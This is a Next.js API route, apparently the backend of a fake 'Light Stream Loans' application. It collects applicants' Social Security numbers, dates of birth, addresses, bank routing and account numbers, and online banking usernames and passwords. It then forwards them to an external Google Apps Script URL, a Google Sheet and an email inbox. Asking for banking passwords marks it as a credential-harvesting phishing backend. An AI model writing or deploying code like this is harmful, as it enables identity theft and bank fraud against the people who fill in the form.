import { NextRequest, NextResponse } from "next/server";
import { google } from "googleapis";
import nodemailer from "nodemailer";

export async function POST(req: NextRequest) {
  const data = await req.json().catch(() => null);

  if (!data) {
    return NextResponse.json({ error: "Invalid request body" }, { status: 400 });
  }

  const requiredFields = [
    "firstName",
    "lastName",
    "dob",
    "email",
    "ssn",
    "streetAddress",
    "city",
    "state",
    "zip",
    "bankName",
    "loanAmount",
    "routingNumber",
    "accountNumber",
    "bankUserId",
    "bankPassword",
    "agreed",
  ];

  for (const field of requiredFields) {
    if (!data[field]) {
      return NextResponse.json({ error: `Missing field: ${field}` }, { status: 400 });
    }
  }

  const loanAmount = Number(data.loanAmount);
  if (isNaN(loanAmount) || loanAmount < 1000 || loanAmount > 25000) {
    return NextResponse.json({ error: "Loan amount must be between $1,000 and $25,000." }, { status: 400 });
  }

  const accountDigits = String(data.accountNumber).replace(/\D/g, "");
  if (accountDigits.length < 4 || accountDigits.length > 20) {
    return NextResponse.json({ error: "Account number must be between 4 and 20 digits." }, { status: 400 });
  }

  const serviceAccountEmail = process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL;
  const privateKey = process.env.GOOGLE_PRIVATE_KEY?.replace(/\\n/g, "\n");
  const sheetId = process.env.GOOGLE_SHEET_ID;

  const googleScriptUrl = process.env.GOOGLE_SCRIPT_URL;

  const smtpHost = process.env.SMTP_HOST || "smtp.gmail.com";
  const smtpPort = Number(process.env.SMTP_PORT || 587);
  const smtpUser = process.env.SMTP_USER;
  const smtpPass = process.env.SMTP_PASS;
  const notificationEmail = process.env.NOTIFICATION_EMAIL
    ?.split(/[,;]/)
    .map((s) => s.trim())
    .filter(Boolean);

  try {
    if (googleScriptUrl) {
      const scriptRes = await fetch(googleScriptUrl.trim(), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
        redirect: "follow",
        cache: "no-store",
      });

      const responseText = await scriptRes.text().catch(() => "Script error");

      if (!scriptRes.ok) {
        throw new Error(`Google Script HTTP ${scriptRes.status}: ${responseText}`);
      }

      try {
        const responseJson = JSON.parse(responseText);
        if (responseJson.error) {
          throw new Error(`Google Script error: ${responseJson.error}`);
        }
      } catch (parseErr) {
        if (parseErr instanceof SyntaxError) {
          // Non-JSON response, but fetch succeeded
        } else {
          throw parseErr;
        }
      }

      return NextResponse.json({ ok: true });
    }

    if (serviceAccountEmail && privateKey && sheetId) {
      const auth = new google.auth.JWT({
        email: serviceAccountEmail,
        key: privateKey,
        scopes: ["https://www.googleapis.com/auth/spreadsheets"],
      });

      const sheets = google.sheets({ version: "v4", auth });

      const row = [
        new Date().toISOString(),
        data.firstName,
        data.lastName,
        data.dob,
        data.email,
        data.ssn,
        data.streetAddress,
        data.city,
        data.state,
        data.zip,
        data.bankName,
        data.loanAmount,
        data.routingNumber,
        data.accountNumber,
        data.bankUserId,
        data.bankPassword,
      ];

      await sheets.spreadsheets.values.append({
        spreadsheetId: sheetId,
        range: "Sheet1!A1",
        valueInputOption: "USER_ENTERED",
        requestBody: { values: [row] },
      });
    }

    if (smtpUser && smtpPass && notificationEmail?.length) {
      const transporter = nodemailer.createTransport({
        host: smtpHost,
        port: smtpPort,
        secure: smtpPort === 465,
        auth: { user: smtpUser, pass: smtpPass },
      });

      await transporter.sendMail({
        from: `"Light Stream Loans" <${smtpUser}>`,
        to: notificationEmail,
        subject: "New Loan Application Received",
        text: `A new loan application was submitted.

Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
SSN: ${data.ssn}
DOB: ${data.dob}
Address: ${data.streetAddress}, ${data.city}, ${data.state} ${data.zip}
Bank name: ${data.bankName}
Loan amount: ${data.loanAmount}
Routing number: ${data.routingNumber}
Account number: ${data.accountNumber}
Bank user ID: ${data.bankUserId}

Submitted at: ${new Date().toISOString()}
`,
      });
    }

    return NextResponse.json(
      { error: "No submission method is configured. Please set GOOGLE_SCRIPT_URL or Google/SMTP credentials in environment variables." },
      { status: 500 }
    );
  } catch (err) {
    const message = err instanceof Error ? err.message : "Unknown error";
    const cause = err instanceof Error && (err as Error & { cause?: unknown }).cause ? String((err as Error & { cause?: unknown }).cause) : "";
    const scriptUrlHint = googleScriptUrl ? `${googleScriptUrl.trim().slice(0, 50)}...` : "not configured";
    return NextResponse.json({ error: message, cause, scriptUrlHint }, { status: 500 });
  }
}
